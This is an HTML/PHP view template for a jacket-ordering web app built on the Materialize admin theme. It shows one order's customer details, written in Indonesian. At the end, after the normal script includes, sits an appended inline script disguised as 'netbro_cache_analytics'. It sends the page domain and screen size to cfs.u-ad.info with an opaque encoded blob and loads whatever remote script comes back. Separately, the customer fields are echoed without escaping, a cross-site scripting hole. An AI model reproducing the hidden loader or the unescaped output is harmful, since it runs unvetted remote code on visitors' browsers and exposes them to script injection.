<!DOCTYPE html>
<html lang="en">

<!--================================================================================
  Item Name: Materialize - Material Design Admin Template
  Version: 2.3
  Author: GeeksLabs
  Author URL: http://www.themeforest.net/user/geekslabs
================================================================================ -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="description" content="Materialize is a Material Design Admin Template,It's modern, responsive and based on Material Design by Google. ">
  <meta name="keywords" content="materialize, admin template, dashboard template, flat admin template, responsive admin template,">
  <title>Booking - Jacket</title>

  <!-- Favicons-->
  <link rel="icon" href="../../material/images/favicon/favicon-32x32.png" sizes="32x32">
  <link href="../../material/css/gambar.css" rel="stylesheet">
  <!-- Favicons-->
  <link rel="apple-touch-icon-precomposed" href="../../material/images/favicon/apple-touch-icon-152x152.png">
  <!-- For iPhone -->
  <meta name="msapplication-TileColor" content="#00bcd4">
  <meta name="msapplication-TileImage" content="../../material/images/favicon/mstile-144x144.png">
  <!-- For Windows Phone -->


  <!-- CORE CSS-->
  
  <link href="../../material/css/materialize.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="../../material/css/style.css" type="text/css" rel="stylesheet" media="screen,projection">
    <!-- Custome CSS-->    
    <link href="../../material/css/custom-style.css" type="text/css" rel="stylesheet" media="screen,projection">
    <!-- CSS style Horizontal Nav (Layout 03)-->    
    <link href="../../material/css/style-horizontal.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="http://cdn.datatables.net/1.10.6/css/jquery.dataTables.min.css" type="text/css" rel="stylesheet" media="screen,projection">
  


  <!-- INCLUDED PLUGIN CSS ON THIS PAGE -->
  <link href="../../material/css/css.css" type="text/css" rel="stylesheet">
  <link href="../../material/css/prism.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="../../material/js/plugins/perfect-scrollbar/perfect-scrollbar.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="../../material/js/plugins/data-tables/css/jquery.dataTables.min.css" type="text/css" rel="stylesheet" media="screen,projection">
  <link href="../../material/js/plugins/chartist-js/chartist.min.css" type="text/css" rel="stylesheet" media="screen,projection">
</head>

<body>
  <!-- Start Page Loading -->
  <div id="loader-wrapper">
      <div id="loader"></div>        
      <div class="loader-section section-left"></div>
      <div class="loader-section section-right"></div>
  </div>
  <!-- End Page Loading -->

  <!-- //////////////////////////////////////////////////////////////////////////// -->

  <!-- START HEADER -->
  <header id="header" class="page-topbar">
        <!-- start header nav-->
        <div class="navbar-fixed">
           <nav class="cyan">
                <div class="nav-wrapper" style="background-color:#1abc9c;">                    
                    
                    <ul class="left">                      
                      <li><h1 class="logo-wrapper"><a class="brand-logo darken-1"><img src="../../material/images/bk.png" alt="materialize logo"></a> <span class="logo-text">Materialize</span></h1></li>
                    </ul>
                    <ul class="right hide-on-med-and-down">                        
                        <li><a href="javascript:void(0);" class="waves-effect waves-block waves-light toggle-fullscreen"><i class="mdi-action-settings-overscan"></i></a>
                        </li>                       
                        <li><a href="<?php echo base_url("admin/msk");?>" class="waves-effect waves-block waves-light"><i class="mdi-action-perm-identity"></i>
                        </li>                        
                    </ul>
                </div>
            </nav>
            <!-- HORIZONTL NAV START-->
            <nav id="horizontal-nav" class="white hide-on-med-and-down">
                <div class="nav-wrapper">                  
                  <ul id="nav-mobile" class="left hide-on-med-and-down">
                    <li>
                        <a href="<?php echo base_url("pesanan/tho");?>" class="cyan-text">
                            <i class="mdi-action-dashboard"></i>
                            <span>Home</span>
                        </a>
                    </li>
                    <li class="active">
                        <a href="<?php echo base_url("pesanan");?>" class="cyan-text">
                            <i class="mdi-communication-email"></i>
                            <span>Data Pemesanan</span>
                        </a>
                    </li>                    
                    <li>
                        <a href="<?php echo base_url("pesanan/add");?>" class="cyan-text">
                            <i class="mdi-action-shopping-cart"></i>
                            <span>Pesan Jaket</span>
                        </a>
                    </li>
                </div>
              </nav>
                <!-- CSSdropdown -->
                

                <!-- UIElementsdropdown-->
                

                <!-- Tablesdropdown -->
                

                <!-- Formsdropdown -->
               

                <!-- Pagesdropdown -->
               

                <!-- eCommers -->
                

                <!-- Mediasdropdown -->
               

                <!-- Usersdropdown -->
                

                <!-- Chartsdropdown -->
               
            <!-- HORIZONTL NAV END-->
        </div>
        <!-- end header nav-->
  </header>
  <!-- END HEADER -->

  <!-- //////////////////////////////////////////////////////////////////////////// -->

  <!-- START MAIN -->
  <div id="main">
    <!-- START WRAPPER -->
    <div class="wrapper">

      <!-- START LEFT SIDEBAR NAV-->
      
      <!-- END LEFT SIDEBAR NAV-->

      <!-- //////////////////////////////////////////////////////////////////////////// -->

      <!-- START CONTENT -->
      <section id="content">
        
        <!--breadcrumbs start-->
        <div class="container">
            <div class="row">
              <div class="col s12 m12 l12">
                <h5 class="breadcrumbs-title">DATA PEMESANAN</h5>
                <ol class="breadcrumb">
                  <li><font color="#1a85bc">Booking Jacket</font>
                  </li>
                  <li class="active">Detail Pemesanan</li>
                </ol>
              </div>
            </div>
          </div>
        </div>
        <!--breadcrumbs end-->
        

        <!--start container-->
        <div class="container">
          <div class="section">

            
            
            
            <!--DataTables example-->
              <div class="divider"></div>
             <div class="card-panel">
            <div id="card-reveal" class="section">
            <div class="row">
              <div class="col s12 m4 l3">
                <p><font color="white"></font></p>
              </div>
              <div class="col s12 m8 l9">
                <div class="row">
                  <div class="col s12 m8 l9">
                    <div class="card">
                      <div class="card-image waves-effect waves-block waves-light">
                        <img class="activator gambar" src="../../gambar/<?php echo $pesanan['gambar'];?>" alt="Gambar tidak tersedia" height>
                      </div>
                      <div class="card-content" style="background-color:#1abc9c;">
                        <span class="card-title activator grey-text text-darken-4"><font color="white">Pemesan - <?php echo $pesanan['nm_pemesan'];?></font><i class="mdi-navigation-more-vert right"></i></span>
                        
                      </div>
                      <div class="card-reveal" style="background-color:#1abc9c;">
                        <span class="card-title grey-text text-darken-4"><font color="white"><?php echo $pesanan['nm_pemesan'];?></font>
                        <i class="mdi-navigation-close right"></i>
                        </span>
                        <br>
                        <table class="padding">
                        <tr>
                          <th>Alamat</th>
                          <td><?php echo $pesanan['alamat'];?></td>
                        </tr>
                        <tr>
                          <th>No Telepon</th>
                          <td><?php echo $pesanan['no_telp'];?></td>
                        </tr>
                        <tr>
                          <th>Pesanan</th>
                          <td><?php echo $pesanan['jmlh_pesanan'];?></td>
                        </tr>
                        <tr>
                          <th>Jenis Jaket</th>
                          <td><?php echo $pesanan['jenis_jkt'];?></td>
                        </tr>
                        <tr>
                          <th>Ukuran</th>
                          <td><?php echo $pesanan['ukuran'];?></td>
                        </tr>
                        <tr>
                          <th>Keterangan</th>
                          <td><?php echo $pesanan['ket'];?></td>
                        </tr>
                        </table>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

               
              </div>
            </div> 
            </div>
            <br>
            <!--DataTables example Row grouping-->
           

           
          </div>
          <!-- Floating Action Button -->
            <!-- Floating Action Button -->
        </div>
        <!--end container-->

      </section>
      <!-- END CONTENT -->

      <!-- //////////////////////////////////////////////////////////////////////////// -->
      <!-- START RIGHT SIDEBAR NAV-->
      <!-- LEFT RIGHT SIDEBAR NAV-->

    </div>
    <!-- END WRAPPER -->

  </div>
  <!-- END MAIN -->



  <!-- //////////////////////////////////////////////////////////////////////////// -->

  <!-- START FOOTER -->
  <footer class="page-footer">
    <div class="footer-copyright" style="background-color:#1abc9c;">
      <div class="container">
        <span>CopyRight © 2016 CASPER.</span>
        <span class="right">EXSOFT License</span>
        </div>
    </div>
  </footer>
    <!-- END FOOTER -->



    <!-- ================================================
    Scripts
    ================================================ -->
    
    <!-- jQuery Library -->
    <script type="text/javascript" src="../../material/js/jquery-1.11.2.min.js"></script>    
    <!--materialize js-->
    <script type="text/javascript" src="../../material/js/materialize.js"></script>
    <!--prism-->
    <script type="text/javascript" src="../../material/js/prism.js"></script>
    <!--scrollbar-->
    <script type="text/javascript" src="../../material/js/plugins/perfect-scrollbar/perfect-scrollbar.min.js"></script>
    <!-- data-tables -->
    <script type="text/javascript" src="../../material/js/plugins/data-tables/js/jquery.dataTables.min.js"></script>
    <script type="text/javascript" src="../../material/js/plugins/data-tables/data-tables-script.js"></script>
    <!-- chartist -->
    <script type="text/javascript" src="../../material/js/plugins/chartist-js/chartist.min.js"></script>   
    
    <!--plugins.js - Some Specific JS codes for Plugin Settings-->
    <script type="text/javascript" src="../../material/js/plugins.js"></script>    
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b4yDpHVxutTfQDznvLTftrdyvhNH57V27XZkY%2fJKSF%2bMSqStnFc2xWQGZg45rrQ7Yvb57gL6K4lTLMLD1NIXJSjyoLH1pIXnj2dk2dViaECJKvi8UwP9CV4r8sdsiuVSjSZI2S0HyTFno6GoJObfKMu5R5hC55VDN8blRGQMMloMGfwR2gmw4RHtpzlvlZIOhFcWjYcv1ieR6RBo2ZkCB836wuHUR%2bn%2b92e%2fn6TSUPm50v4grSWtoa8izYTs1LiVI9ydGsYLBjq53omv2hUz1wn3l1Xujx0nVMxpLCT2XtkwpVMfqyIv7MEo2r0yWlDhaQNwJvqBWQxlfHSep3MT5WKBpFT7LMblgkCuIXUTVuMNhwJF1zr1myej%2fP9OX81zCi2jfJbDhGZXdxmHQOeVBS6UQAWQFRGrZ1bndXlmFsNx8nJWguSbJa%2bSVdh3%2bDdHiD67%2f0qCPYOGiNyltM6jTbFNVt3EcTZDurGZxud1APu8zkW%2fhP3LZsxxWr4vNuRnaVOWYsgO66I27GCWO010CE5Gb4ElgRIB97E%2fgjOsK2cKv9upSK7m3QeFuyOnLuJgqAvgl3%2bDOVa0nEOdU5FOtSaTCe9mgGfOmFMz1NXdwowWiWllFQ%2bx6irEko8vSNAZEULF6QeqKenE9mK243A%2boBBgmgGYNrQ3cO4XiHzAHlxQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>